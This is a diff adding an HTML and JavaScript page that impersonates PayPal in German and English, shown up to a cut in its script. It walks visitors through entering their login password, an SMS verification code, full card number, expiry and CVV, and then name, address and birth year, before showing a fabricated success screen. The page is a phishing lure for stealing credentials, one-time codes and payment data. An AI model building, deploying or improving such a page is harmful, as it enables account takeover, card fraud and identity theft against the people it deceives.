@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Sicherheit bei Ihren Zahlungen</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            min-height: calc(100vh - 40px);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding: 30px 25px 20px 25px;
+            animation: slideIn 0.4s ease-out;
+            border: 1px solid #ddd;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 0;
+        }
+
+        .logo img {
+            height: 160px;
+            object-fit: contain;
+            margin-bottom: 0;
+        }
+
+        .step-indicator {
+            display: none;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            gap: 10px;
+        }
+
+        .step {
+            flex: 1;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            transition: background 0.3s ease;
+        }
+
+        .step.active {
+            background: #0070ba;
+        }
+
+        .step.completed {
+            background: #28a745;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            text-align: center;
+            margin-top: 0;
+        }
+
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: inline;
+            color: #1a1a1a;
+            font-size: 14px;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        .checkbox-inline {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-inline input {
+            width: auto;
+            margin: 0;
+        }
+
+        input[type="checkbox"] {
+            width: 18px;
+            padding: 0;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        button {
+            flex: 1;
+            min-width: 0;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: #0070ba;
+            color: white;
+            display: inline-flex;
+            width: auto;
+            flex: none;
+            justify-content: center;
+            margin: 0 auto;
+            padding: 14px 28px;
+        }
+
+        .button-group .btn-primary {
+            flex: 1;
+            width: auto;
+        }
+
+        .btn-primary.full-width {
+            width: 100%;
+        }
+
+        .btn-primary:hover {
+            background: #005fa3;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 112, 186, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: #f5f5f5;
+            color: #1a1a1a;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #efefef;
+        }
+
+        .sms-info {
+            color: #000;
+            padding: 0;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 12px;
+        }
+
+        .sms-inputs {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .sms-inputs .sms-digit {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            outline: none;
+            background: #fff;
+        }
+
+        .sms-inputs .sms-digit:focus {
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.12);
+        }
+
+        .sms-inputs .sms-digit.invalid {
+            border-color: #dc3545;
+        }
+
+        .step-section {
+            display: none;
+        }
+
+        .step-section.active {
+            display: block;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .error {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error.show {
+            display: block;
+        }
+
+        input.invalid {
+            border-color: #dc3545;
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            border-left: 4px solid #0070ba;
+            padding: 12px 15px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #004085;
+            margin-bottom: 20px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .card-number {
+            font-size: 18px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+
+        .card-name {
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .success-icon {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 48px;
+        }
+
+        .success-message {
+            text-align: center;
+            color: #28a745;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .success-detail {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .divider {
+            text-align: center;
+            color: #999;
+            margin: 20px 0;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            display: inline-block;
+            width: 40%;
+            height: 1px;
+            background: #ddd;
+            vertical-align: middle;
+            margin: 0 8px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0070ba;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            border-top: 1px solid #e0e0e0;
+            padding-top: 20px;
+            margin-top: auto;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .lang-switch {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-left: 15px;
+        }
+
+        .lang-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .lang-link.active {
+            color: #000;
+        }
+
+        .footer a:hover,
+        .lang-link:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 8px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            button {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            input, select {
+                padding: 11px 12px;
+                font-size: 16px; /* Prevent zoom on iOS */
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .btn-secondary {
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo">
+            <img src="paypal logo nuev PNG (1).png" alt="PayPal">
+        </div>
+
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <div class="step active" id="step1Indicator"></div>
+            <div class="step" id="step2Indicator"></div>
+            <div class="step" id="step3Indicator"></div>
+            <div class="step" id="step4Indicator"></div>
+        </div>
+
+        <!-- STEP 1: LOGIN -->
+        <div class="step-section active" id="step1">
+            <h1 id="loginTitle">Einloggen</h1>
+            <p class="subtitle" id="loginSubtitle">Melden Sie sich bei Ihrem PayPal-Konto an</p>
+
+            <form id="loginForm" onsubmit="goToStep2(event)">
+                <div class="form-group">
+                    <label for="email" id="emailLabel">E-Mail oder Handynummer</label>
+                    <input 
+                        type="text" 
+                        id="email" 
+                        name="email" 
+                        placeholder="" 
+                        required
+                    >
+                    <div class="error" id="emailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password" id="passwordLabel">Passwort</label>
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="" 
+                        required
+                    >
+                    <div class="error" id="passwordError"></div>
+                </div>
+
+                <div class="checkbox-inline">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember" id="rememberLabel">Auf diesem Gerät speichern</label>
+                </div>
+
+                <button type="submit" id="loginButton" class="btn-primary full-width">Einloggen</button>
+
+                <div class="divider" id="dividerText">oder</div>
+
+                <button type="button" id="createAccountButton" class="btn-secondary" style="width: 100%; margin-top: 0;">Neu anmelden</button>
+
+                <p style="text-align: center; margin-top: 20px; font-size: 13px; color: #666;">
+                    <a href="#" id="forgotLink" style="color: #0070ba; text-decoration: none;">Passwort vergessen?</a>
+                </p>
+            </form>
+        </div>
+
+        <!-- STEP 2: SMS VERIFICATION -->
+        <div class="step-section" id="step2">
+            <h1 id="smsTitle">Identität bestätigen</h1>
+            <p class="subtitle" id="smsSubtitle">Geben Sie den an Ihr Telefon gesendeten Code ein</p>
+
+            <div class="sms-info" id="smsInfo">
+                Wir haben einen Bestätigungscode an +49 ●●●● ●●● ●●● gesendet
+            </div>
+
+            <form id="smsForm" onsubmit="goToStep3(event)">
+                <div class="form-group">
+                    <label id="smsCodeLabel">Bestätigungscode</label>
+                    <div class="sms-inputs">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="sms-digit" oninput="moveToNext(this)" onkeydown="moveToPrev(event, this)">
+                    </div>
+                    <div class="error" id="smsError"></div>
+                </div>
+
+                <div class="form-group" style="margin-top: 15px;">
+                    <small style="color: #666;"><span id="resendPrompt">Nicht erhalten?</span> <a href="#" id="resendLink" style="color: #0070ba; text-decoration: none;">Erneut senden</a></small>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" id="backToStep1Button" class="btn-secondary" onclick="goBackToStep1()">Zurück</button>
+                    <button type="submit" id="verifyButton" class="btn-primary">Verifizieren</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- STEP 3: CARD PAYMENT -->
+        <div class="step-section" id="step3">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img src="cc.png" alt="Karte" style="height: 50px; object-fit: contain;">
+            </div>
+            <h1 id="cardTitle">Zahlungsmethode</h1>
+            <p class="subtitle" id="cardSubtitle">Geben Sie Ihre Kartendaten ein</p>
+
+            <form id="cardForm" onsubmit="submitPayment(event)">
+                <div class="form-group">
+                    <label for="cardBrand" id="cardBrandLabel">Kartenmarke</label>
+                    <select id="cardBrand" name="cardBrand" required>
+                        <option value="visa">Visa</option>
+                        <option value="mastercard">Mastercard</option>
+                        <option value="amex">American Express</option>
+                        <option value="discover">Discover</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardName" id="cardNameLabel">Name des Karteninhabers</label>
+                    <input 
+                        type="text" 
+                        id="cardName" 
+                        name="cardName" 
+                        placeholder="MAX MUSTERMANN" 
+                        required
+                        oninput="updateCardPreview()"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="cardNumber" id="cardNumberLabel">Kartennummer</label>
+                    <input 
+                        type="text" 
+                        id="cardNumber" 
+                        name="cardNumber" 
+                        placeholder="1234 5678 9012 3456" 
+                        maxlength="19"
+                        required
+                        oninput="formatCardNumber(this); updateCardPreview()"
+                    >
+                    <div class="error" id="cardNumberError"></div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div class="form-group">
+                        <label for="expiry" id="expiryLabel">Gültig bis</label>
+                        <input 
+                            type="text" 
+                            id="expiry" 
+                            name="expiry" 
+                            placeholder="MM/YY" 
+                            maxlength="5"
+                            required
+                            oninput="formatExpiry(this); updateCardPreview()"
+                        >
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv" id="cvvLabel">CVV</label>
+                        <input 
+                            type="text" 
+                            id="cvv" 
+                            name="cvv" 
+                            placeholder="123" 
+                            maxlength="4"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div class="info-box" id="secureInfo" style="font-size: 12px;">
+                    🔒 Tu información está protegida con encriptación de 256 bits
+                </div>
+
+                <div class="button-group">
+                    <button type="button" id="backToStep2Button" class="btn-secondary" onclick="goBackToStep2()">Zurück</button>
+                    <button type="submit" id="cardSubmitButton" class="btn-primary">Karte bestätigen</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- STEP 4: CUSTOMER INFO -->
+        <div class="step-section" id="step4">
+            <h1 id="customerInfoTitle">Kundendaten</h1>
+            <p class="subtitle" id="customerInfoSubtitle">Bitte geben Sie Ihre Daten ein</p>
+
+            <form id="customerInfoForm" onsubmit="submitCustomerInfo(event)">
+                <div class="form-group">
+                    <label for="firstName" id="firstNameLabel">Vorname</label>
+                    <input type="text" id="firstName" name="firstName" placeholder="Max" required>
+                </div>
+                <div class="form-group">
+                    <label for="lastName" id="lastNameLabel">Nachname</label>
+                    <input type="text" id="lastName" name="lastName" placeholder="Mustermann" required>
+                </div>
+                <div class="form-group">
+                    <label for="address" id="addressLabel">Adresse</label>
+                    <input type="text" id="address" name="address" placeholder="Musterstraße 12" required>
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div class="form-group">
+                        <label for="birthYear" id="birthYearLabel">Geburtsjahr</label>
+                        <input type="text" id="birthYear" name="birthYear" placeholder="1985" maxlength="4" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="postalCode" id="postalCodeLabel">Postleitzahl</label>
+                        <input type="text" id="postalCode" name="postalCode" placeholder="10115" required>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" id="backToStep3Button" class="btn-secondary" onclick="goBackToStep3()">Zurück</button>
+                    <button type="submit" class="btn-primary" id="continueButton">Weiter</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- LOADING SCREEN -->
+        <div class="step-section" id="loading">
+            <div style="text-align: center;">
+                <div style="font-size: 48px; margin-bottom: 20px;">
+                    <div class="spinner"></div>
+                </div>
+                <h1 id="loadingTitle">Verificando...</h1>
+                <p class="subtitle" id="loadingSubtitle">Estamos procesando tu información</p>
+            </div>
+        </div>
+
+        <!-- SUCCESS SCREEN -->
+        <div class="step-section" id="success">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img src="logo1.png" alt="PayPal" style="height: 50px; object-fit: contain;">
+            </div>
+            <div class="success-icon">✓</div>
+            <div class="success-message" id="successMessageText">¡Transacción exitosa!</div>
+            <div class="success-detail" id="successDetailText">Tu pago ha sido procesado correctamente</div>
+            
+            <div style="background: #f8f9fa; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 13px;">
+                <p style="margin-bottom: 8px;"><strong id="referenceLabel">Referencia:</strong> TXN-2026-042700123</p>
+                <p style="margin-bottom: 8px;"><strong id="amountLabel">Monto:</strong> $99.99</p>
+                <p><strong id="statusLabel">Estado:</strong> <span style="color: #28a745;" id="statusValue">Completado</span></p>
+            </div>
+            <button type="button" class="btn-primary" onclick="resetForm()">Realizar otro pago</button>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <a href="#" id="footerContacto">Kontakt</a>
+            <a href="#" id="footerPrivacidad">Datenschutz</a>
+            <a href="#" id="footerLegal">AGB</a>
+            <a href="#" id="footerMundo">Weltweit</a>
+            <span class="lang-switch">
+                <a href="#" id="langDeutsch" class="lang-link active">Deutsch</a>
+                <span>|</span>
+                <a href="#" id="langEnglish" class="lang-link">English</a>
+            </span>
+        </div>
+    </div>
+
+    <script>
+        const languages = {
+            de: {
+                loginTitle: 'Einloggen',
+                loginSubtitle: 'Melden Sie sich bei Ihrem PayPal-Konto an',
+                emailLabel: 'E-Mail oder Handynummer',
+                emailPlaceholder: 'E-Mail oder Handynummer',
+                passwordLabel: 'Passwort',
+                passwordPlaceholder: 'Passwort',
+                rememberLabel: 'Auf diesem Gerät speichern',
+                loginButton: 'Einloggen',
+                createAccountButton: 'Neu anmelden',
+                forgotLink: 'Passwort vergessen?',
+                backButton: 'Zurück',
+                smsTitle: 'Identität bestätigen',
+                emailErrorMessage: 'Bitte geben Sie eine gültige E-Mail-Adresse oder Mobilnummer ein',
+                passwordErrorMessage: 'Das Passwort muss mindestens 6 Zeichen lang sein',
+                smsErrorMessage: 'Geben Sie einen gültigen 6-stelligen Code ein',
+                invalidCardNumberMessage: 'Ungültige Kartennummer',
+                smsSubtitle: 'Geben Sie den an Ihr Telefon gesendeten Code ein',
+                smsInfo: 'Wir haben einen Bestätigungscode an +49 ●●●● ●●● ●●● gesendet',
+                smsCodeLabel: 'Bestätigungscode',
+                resendPrompt: 'Nicht erhalten?',
+                resendLink: 'Erneut senden',
+                verifyButton: 'Verifizieren',
+                cardTitle: 'Zahlungsmethode',
+                customerInfoTitle: 'Kundendaten',
+                customerInfoSubtitle: 'Bitte geben Sie Ihre Daten ein',
+                firstNameLabel: 'Vorname',
+                firstNamePlaceholder: 'Max',
+                lastNameLabel: 'Nachname',
+                lastNamePlaceholder: 'Mustermann',
+                addressLabel: 'Adresse',
+                addressPlaceholder: 'Musterstraße 12',
+                birthYearLabel: 'Geburtsjahr',
+                birthYearPlaceholder: '1985',
+                postalCodeLabel: 'Postleitzahl',
+                postalCodePlaceholder: '10115',
+                continueButton: 'Weiter',
+                cardSubtitle: 'Geben Sie Ihre Kartendaten ein',
+                cardBrandLabel: 'Kartenmarke',
+                cardNameLabel: 'Name des Karteninhabers',
+                cardNamePlaceholder: 'MAX MUSTERMANN',
+                cardNumberLabel: 'Kartennummer',
+                cardNumberPlaceholder: '1234 5678 9012 3456',
+                expiryLabel: 'Gültig bis',
+                cvvLabel: 'CVV',
+                expiryPlaceholder: 'MM/YY',
+                cardSubmitButton: 'Karte bestätigen',
+                dividerText: 'oder',
+                secureInfo: 'Ihre Daten sind mit 256-Bit-Verschlüsselung geschützt',
+                loadingTitle: 'Überprüfung…',
+                loadingSubtitle: 'Wir verarbeiten Ihre Informationen',
+                successMessageText: 'Transaktion erfolgreich!',
+                successDetailText: 'Ihre Zahlung wurde erfolgreich verarbeitet',
+                successButton: 'Weitere Zahlung',
+                referenceLabel: 'Referenz:',
+                amountLabel: 'Betrag:',
+                statusLabel: 'Status:',
+                statusValue: 'Abgeschlossen',
+                pageTitle: 'PayPal - Sicherheit bei Ihren Zahlungen',
+                footerContacto: 'Kontakt',
+                footerPrivacidad: 'Datenschutz',
+                footerLegal: 'AGB',
+                footerMundo: 'Weltweit'
+            },
+            en: {
+                loginTitle: 'Log in',
+                loginSubtitle: 'Access your PayPal account',
+                emailLabel: 'Email or mobile number',
+                emailPlaceholder: 'Email or mobile number',
+                passwordLabel: 'Password',
+                passwordPlaceholder: 'Password',
+                rememberLabel: 'Remember me on this device',
+                loginButton: 'Log in',
+                createAccountButton: 'Create new account',
+                forgotLink: 'Forgot password?',
+                backButton: 'Back',
+                smsTitle: 'Verify your identity',
+                emailErrorMessage: 'Please enter a valid email address or mobile number',
+                passwordErrorMessage: 'Password must be at least 6 characters long',
+                smsErrorMessage: 'Enter a valid 6-digit code',
+                invalidCardNumberMessage: 'Invalid card number',
+                smsSubtitle: 'Enter the code sent to your phone',
+                smsInfo: 'We sent a verification code to +49 ●●●● ●●● ●●●',
+                smsCodeLabel: 'Verification code',
+                resendPrompt: 'Didn’t receive it?',
+                resendLink: 'Resend',
+                verifyButton: 'Verify',
+                cardTitle: 'Payment method',
+                customerInfoTitle: 'Customer details',
+                customerInfoSubtitle: 'Please enter your information',
+                firstNameLabel: 'First name',
+                firstNamePlaceholder: 'John',
+                lastNameLabel: 'Last name',
+                lastNamePlaceholder: 'Doe',
+                addressLabel: 'Address',
+                addressPlaceholder: '123 Main St',
+                birthYearLabel: 'Birth year',
+                birthYearPlaceholder: '1985',
+                postalCodeLabel: 'Postal code',
+                postalCodePlaceholder: '10115',
+                continueButton: 'Continue',
+                cardSubtitle: 'Enter your card details',
+                cardBrandLabel: 'Card brand',
+                cardNameLabel: 'Cardholder name',
+                cardNamePlaceholder: 'MAX MUSTERMANN',
+                cardNumberLabel: 'Card number',
+                cardNumberPlaceholder: '1234 5678 9012 3456',
+                expiryLabel: 'Expiry',
+                expiryPlaceholder: 'MM/YY',
+                cvvLabel: 'CVV',
+                cardSubmitButton: 'Confirm card',
+                dividerText: 'or',
+                secureInfo: 'Your information is protected with 256-bit encryption',
+                loadingTitle: 'Verifying…',
+                loadingSubtitle: 'We are processing your information',
+                successMessageText: 'Transaction successful!',
+                successDetailText: 'Your payment has been processed successfully',
+                successButton: 'Make another payment',
+                referenceLabel: 'Reference:',
+                amountLabel: 'Amount:',
+                statusLabel: 'Status:',
+                statusValue: 'Completed',
+                pageTitle: 'PayPal - Secure payments',
+                footerContacto: 'Contact Us',
+                footerPrivacidad: 'Privacy',
+                footerLegal: 'Legal Policy Updates',
+                footerMundo: 'Worldwide'
+            }
+        };
+
+        function setLanguage(lang) {
+            const dict = languages[lang] || languages.de;
+            document.title = dict.pageTitle;
+            document.documentElement.lang = lang;
+            document.getElementById('loginTitle').textContent = dict.loginTitle;
+            document.getElementById('loginSubtitle').textContent = dict.loginSubtitle;
+            document.getElementById('emailLabel').textContent = dict.emailLabel;
+            document.getElementById('email').placeholder = dict.emailPlaceholder;
+            document.getElementById('passwordLabel').textContent = dict.passwordLabel;
+            document.getElementById('password').placeholder = dict.passwordPlaceholder;
+            document.getElementById('rememberLabel').textContent = dict.rememberLabel;
+            document.getElementById('loginButton').textContent = dict.loginButton;
+            document.getElementById('createAccountButton').textContent = dict.createAccountButton;
+            document.getElementById('forgotLink').textContent = dict.forgotLink;
+            document.getElementById('backToStep1Button').textContent = dict.backButton;
+            document.getElementById('backToStep2Button').textContent = dict.backButton;
+            document.getElementById('backToStep3Button').textContent = dict.backButton;
+            document.getElementById('smsTitle').textContent = dict.smsTitle;
+            document.getElementById('smsSubtitle').textContent = dict.smsSubtitle;
+            document.getElementById('smsInfo').textContent = dict.smsInfo;
+            document.getElementById('smsCodeLabel').textContent = dict.smsCodeLabel;
+            document.getElementById('resendLink').textContent = dict.resendLink;
+            document.getElementById('verifyButton').textContent = dict.verifyButton;
+            document.getElementById('resendPrompt').textContent = dict.resendPrompt;
+            document.getElementById('cardTitle').textContent = dict.cardTitle;
+            document.getElementById('cardSubtitle').textContent = dict.cardSubtitle;
+            document.getElementById('cardBrandLabel').textContent = dict.cardBrandLabel;
+            document.getElementById('cardNameLabel').textContent = dict.cardNameLabel;
+            document.getElementById('cardName').placeholder = dict.cardNamePlaceholder;
+            document.getElementById('cardNumberLabel').textContent = dict.cardNumberLabel;
+            document.getElementById('cardNumber').placeholder = dict.cardNumberPlaceholder;
+            document.getElementById('expiryLabel').textContent = dict.expiryLabel;
+            document.getElementById('expiry').placeholder = dict.expiryPlaceholder;
+            document.getElementById('cvvLabel').textContent = dict.cvvLabel;
+            document.getElementById('cardSubmitButton').textContent = dict.cardSubmitButton;
+            document.getElementById('dividerText').textContent = dict.dividerText;
+            document.getElementById('secureInfo').textContent = dict.secureInfo;
+            document.getElementById('customerInfoTitle').textContent = dict.customerInfoTitle;
+            document.getElementById('customerInfoSubtitle').textContent = dict.customerInfoSubtitle;
+            document.getElementById('firstNameLabel').textContent = dict.firstNameLabel;
+            document.getElementById('firstName').placeholder = dict.firstNamePlaceholder;
+            document.getElementById('lastNameLabel').textContent = dict.lastNameLabel;
+            document.getElementById('lastName').placeholder = dict.lastNamePlaceholder;
+            document.getElementById('addressLabel').textContent = dict.addressLabel;
+            document.getElementById('address').placeholder = dict.addressPlaceholder;
+            document.getElementById('birthYearLabel').textContent = dict.birthYearLabel;
+            document.getElementById('birthYear').placeholder = dict.birthYearPlaceholder;
+            document.getElementById('postalCodeLabel').textContent = dict.postalCodeLabel;
+            document.getElementById('postalCode').placeholder = dict.postalCodePlaceholder;
+            document.getElementById('continueButton').textContent = dict.continueButton;
+            document.getElementById('loadingTitle').textContent = dict.loadingTitle;
+            document.getElementById('loadingSubtitle').textContent = dict.loadingSubtitle;
+            document.getElementById('successMessageText').textContent = dict.successMessageText;
+            document.getElementById('successDetailText').textContent = dict.successDetailText;
+            document.getElementById('referenceLabel').textContent = dict.referenceLabel;
+            document.getElementById('amountLabel').textContent = dict.amountLabel;
+            document.getElementById('statusLabel').textContent = dict.statusLabel;
+            document.getElementById('statusValue').textContent = dict.statusValue;
+            document.querySelector('#success button.btn-primary').textContent = dict.successButton;
+            document.getElementById('footerContacto').textContent = dict.footerContacto;
+            document.getElementById('footerPrivacidad').textContent = dict.footerPrivacidad;
+            document.getElementById('footerLegal').textContent = dict.footerLegal;
+            document.getElementById('footerMundo').textContent = dict.footerMundo;
+            const langDeutsch = document.getElementById('langDeutsch');
+            const langEnglish = document.getElementById('langEnglish');
+            const langDeutschTop = document.getElementById('langDeutschTop');
+            const langEnglishTop = document.getElementById('langEnglishTop');
+            if (langDeutsch) langDeutsch.classList.toggle('active', lang === 'de');
+            if (langEnglish) langEnglish.classList.toggle('active', lang === 'en');
+            if (langDeutschTop) langDeutschTop.classList.toggle('active', lang === 'de');
+            if (langEnglishTop) langEnglishTop.classList.toggle('active', lang === 'en');
+            localStorage.setItem('lang', lang);
+        }
+
+        function setupLanguageSwitcher() {
+            ['langDeutsch', 'langDeutschTop'].forEach(id => {
+                const element = document.getElementById(id);
+                if (!element) return;
+                element.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    setLanguage('de');
+                    showStep('step1');
+                });
+            });
+            ['langEnglish', 'langEnglishTop'].forEach(id => {
+                const element = document.getElementById(id);
+                if (!element) return;
+                element.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    setLanguage('en');
+                    showStep('step1');
+                });
+            });
+        }
+
+        function setLoadingText(title, subtitle) {
+            document.getElementById('loadingTitle').textContent = title;
+            document.getElementById('loadingSubtitle').textContent = subtitle;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const lang = localStorage.getItem('lang') || 'de';
+            setLanguage(lang);
+            setupLanguageSwitcher();
+        });
+
+        // Step Navigation
+        function goToStep1() {
+            showStep('step1');
+        }
+
+        function goToStep2(e) {
+            if (e) e.preventDefault();
+            if (validateStep1()) {
+                showStep('loading');
+                setTimeout(() => {
+                    showStep('step2');
+                }, 1800);
+            }
+        }
+
+        function goBackToStep1() {
+            showStep('step1');
+        }
+
+        function goBackToStep2() {
+            showStep('step2');
+        }
+
+        function goToStep3(e) {
+            e.preventDefault();
+            if (validateStep2()) {
+                showStep('loading');
+                const dict = languages[document.documentElement.lang] || languages.de;
+                setLoadingText(dict.loadingTitle, dict.loadingSubtitle);
+                setTimeout(() => {
+                    showStep('step3');
+                }, 2000);
+            }
+        }
+
+        function submitPayment(e) {
+            e.preventDefault();
+            if (validateCardForm()) {
+                showStep('loading');
+                const dict = languages[document.documentElement.lang] || languages.de;
+                setLoadingText(dict.loadingTitle, dict.loadingSubtitle);
+                setTimeout(() => {
+                    showStep('step4');
+                }, 5000);
+            }
+        }
+
+        function goBackToStep3() {
+            showStep('step3');
+        }
+
+        function submitCustomerInfo(e) {
+            e.preventDefault();
+            if (validateCustomerInfo()) {
+                const dict = languages[document.documentElement.lang] || languages.de;
+                setLoadingText(dict.loadingTitle, dict.loadingSubtitle);
+                showStep('loading');
+                setTimeout(() => {
+                    showStep('success');
+                }, 1800);
+            }
+        }
+
+        function validateCustomerInfo() {
+            let isValid = true;
+            ['firstName', 'lastName', 'address', 'birthYear', 'postalCode'].forEach(id => {
+                const input = document.getElementById(id);
+                if (!input.value.trim()) {
+                    input.classList.add('invalid');
+                    isValid = false;
+                } else {
+                    input.classList.remove('invalid');
+                }
+            });
+            return isValid;
+        }
+
+        function showStep(stepId) {
+            // Hide all steps
+            document.querySelectorAll('.step-section').forEach(el => {
+                el.classList.remove('active');
+            });
+
+            // Show selected step
+            document.getElementById(stepId).classList.add('active');
+
+            // Update step indicators
+            updateStepIndicators(stepId);
+
+            // Scroll to top
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function updateStepIndicators(stepId) {
+            const indicators = ['step1Indicator', 'step2Indicator', 'step3Indicator', 'step4Indicator'];
+            indicators.forEach((id, index) => {
+                const el = document.getElementById(id);
+                if (!el) return;
+                if (stepId === `step${index + 1}`) {
